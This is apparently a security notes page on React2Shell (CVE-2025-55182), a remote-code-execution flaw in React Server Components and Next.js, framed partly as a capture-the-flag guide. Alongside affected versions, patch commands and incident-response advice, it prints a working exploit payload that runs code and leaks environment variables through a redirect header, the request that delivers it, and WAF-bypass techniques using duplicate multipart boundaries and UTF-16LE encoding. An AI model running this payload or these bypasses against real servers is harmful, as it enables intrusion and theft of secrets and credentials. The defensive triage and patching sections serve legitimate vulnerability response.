# React / Next.js

## React2Shell / RSC RCE

React2Shell is CVE-2025-55182, an unauthenticated RCE in React Server Components caused by unsafe decoding of payloads sent to React Server Function endpoints. The React advisory says apps can still be vulnerable if they support React Server Components, even if they do not explicitly implement Server Function endpoints.

Affected React packages:

```text
react-server-dom-webpack 19.0, 19.1.0, 19.1.1, 19.2.0
react-server-dom-parcel 19.0, 19.1.0, 19.1.1, 19.2.0
react-server-dom-turbopack 19.0, 19.1.0, 19.1.1, 19.2.0
```

Patched React versions:

```text
19.0.1
19.1.2
19.2.1
```

Next.js impact:

```text
Affected: App Router on Next.js 15.x, 16.x, and 14.3.0-canary.77+ canary.
Not affected per Next advisory: Next.js 13.x, stable 14.x, Pages Router, Edge Runtime.
```

Original RCE-only Next.js patch lines:

```text
15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7
15.6.0-canary.58, 16.1.0-canary.12
```

Later RSC fixes for DoS/source exposure require newer Next.js patched versions:

```text
14.2.35 for 13.3.x, 13.4.x, 13.5.x, 14.x
15.0.8, 15.1.12, 15.2.9, 15.3.9, 15.4.10, 15.5.10
16.0.11, 16.1.5
15.6.0-canary.61, 16.1.0-canary.19
```

Triage:

```bash
cat package.json
npm ls react react-dom next react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack
rg -n "\"next\"|\"react\"|react-server-dom|use server|server action|app/" .
```

Lockfile grep:

```bash
rg -n '"(next|react|react-dom|react-server-dom-webpack|react-server-dom-parcel|react-server-dom-turbopack)"' package.json package-lock.json pnpm-lock.yaml yarn.lock
npm audit --omit dev
```

Find App Router / Server Action surfaces:

```bash
rg -n "use server|export async function|function .*Action|<form[^>]+action=|Next-Action|RSC|_rsc|app/" app src pages .
```

Patch:

```bash
npm install react@latest react-dom@latest
npm install react-server-dom-webpack@latest
npm install react-server-dom-parcel@latest
npm install react-server-dom-turbopack@latest

# Next.js helper from the advisory; still verify exact target versions.
npx fix-react2shell-next
```

Detection hints:

```text
RSC / Server Action traffic often uses headers such as Next-Action or RSC-Action-ID.
Exploit attempts commonly target RSC/Server Function request parsing with form or multipart bodies.
Version-only scanners may not trigger WAF exploit signatures.
```

Probe commands:

```bash
curl -i http://HOST/ -H 'RSC: 1'
curl -i 'http://HOST/?_rsc=1'
curl -i http://HOST/ -X POST -H 'Next-Action: x' -F '0=[]'
curl -i http://HOST/ -X POST -H 'content-type: text/x-component' --data '[]'
```

CTF workflow:

```text
1. Read package.json/package-lock.json for next/react/react-server-dom-* versions.
2. Find App Router files: app/, "use server", server actions, form action.
3. Start the origin without proxy/WAF and prove RCE with a local side effect.
4. Put the WAF/proxy back and diff request parsing.
5. Leak through framework-visible output, commonly redirect headers or rendered RSC response.
```

Public tools:

```bash
# Assetnote scanner
git clone https://github.com/assetnote/react2shell-scanner
cd react2shell-scanner
python3 scanner.py -u https://HOST
python3 scanner.py -u https://HOST --safe-check
python3 scanner.py -l hosts.txt -t 20 -o results.json
python3 scanner.py -u https://HOST -H "Cookie: session=COOKIE"

# ProjectDiscovery nuclei template
nuclei -update
nuclei -update-templates
nuclei -u https://HOST -t http/cves/2025/CVE-2025-55182.yaml

# Next.js patch helper
npx fix-react2shell-next
```

Useful repos / pages:

```text
https://github.com/assetnote/react2shell-scanner
https://github.com/projectdiscovery/nuclei
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-55182.yaml
https://github.com/vercel-labs/fix-react2shell-next
https://react2shell.com/
https://github.com/l4rm4nd/CVE-2025-55182
```

Be careful with random PoC repos. Prefer scanner-only repos or read the code before running anything.

Useful RSC / Flight parser details to verify in source:

```text
Chunk references can be parsed with parseInt(..., 16), so hex IDs may work.
$@+0 can still parse as chunk 0 while bypassing regexes that expect $@ followed by digits.
$a refers to numeric chunk 10, so the matching form field key may need to be "10".
Server Action responses may expose redirects in x-action-redirect.
```

WAF bypass levers seen in RSC challenges:

```text
multipart/form-data instead of JSON
duplicate multipart boundary params
part-level charset such as utf-16le
hex chunk IDs instead of decimal IDs
numeric grammar variants: +0, 00, 0x0 where accepted
throw framework redirect to exfiltrate env vars through a header
```

Core payload object:

```js
const payload = {
  then: "$a:__proto__:then",
  status: "resolved_model",
  reason: -1,
  value: "{\"then\":\"$B0\"}",
  _response: {
    _prefix:
      "var r=encodeURIComponent(process.env.FLAG||'NOFLAG');" +
      "throw Object.assign(new Error('NEXT_REDIRECT')," +
      "{digest:'NEXT_REDIRECT;push;/leak?x='+r+';307;'});",
    _formData: {
      get: "$a:constructor:constructor",
    },
  },
};
```

Direct origin request:

```js
const fd = new FormData();
fd.append("0", JSON.stringify(payload));
fd.append("10", "\"$@+0\"");

await fetch("http://127.0.0.1:3000/", {
  method: "POST",
  redirect: "manual",
  headers: { "Next-Action": "x" },
  body: fd,
});
```

Duplicate-boundary / UTF-16LE WAF bypass shape:

```http
POST / HTTP/1.1
Host: target
Next-Action: x
Content-Type: multipart/form-data; boundary=REAL; boundary=FAKE

--FAKE
Content-Disposition: form-data; name="safe"

hello
--FAKE--
--REAL
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf-16le

<UTF-16LE JSON payload bytes>
--REAL
Content-Disposition: form-data; name="10"
Content-Type: text/plain; charset=utf-16le

<UTF-16LE bytes for "$@+0">
--REAL--
```

Parser differential table:

| Payload Feature | Backend Meaning | WAF View |
| --- | --- | --- |
| `$@+0` | chunk reference to `0` | misses `\$@\d+` |
| `$a` + form field `10` | hex chunk ID `a` -> decimal field `10` | avoids hardcoded `$1` signatures |
| UTF-16LE part | decoded by multipart parser | raw ASCII signatures hidden |
| duplicate boundary | backend parses real body | WAF may parse fake body |

Incident response:

```text
If the app was public and unpatched during the disclosure window, patch first, redeploy, then rotate secrets.
Prioritize env vars, API keys, database credentials, signing keys, and deployment tokens.
Do not rely on hosting-provider or WAF mitigations as the final fix.
```

Sources:

* [React advisory: Critical Security Vulnerability in React Server Components](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
* [Next.js advisory: CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)
* [Next.js security update, December 11 2025](https://nextjs.org/blog/security-update-2025-12-11)
* [Google Cloud response and WAF detection notes](https://cloud.google.com/blog/products/identity-security/responding-to-cve-2025-55182)
